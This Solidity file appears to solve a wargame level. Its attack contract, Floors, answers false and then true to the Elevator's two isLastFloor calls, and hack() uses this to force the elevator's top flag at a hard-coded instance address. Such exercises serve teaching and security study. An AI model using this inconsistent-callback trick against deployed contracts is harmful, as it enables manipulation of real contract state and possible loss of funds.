// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract Floors is Elevator {
    Elevator public el = Elevator(0xc52432A65B987F53CdE9d2EA33a2C4F6F28905aD); //instance address
    bool public switchFlipped = false;

    function isLastFloor(uint) external returns (bool) {
        if (switchFlipped) {
            return true;
        } else {
            switchFlipped = true;
            return false;
        }
    }

    function hack() external payable {
        el.goTo(1);
    }
}
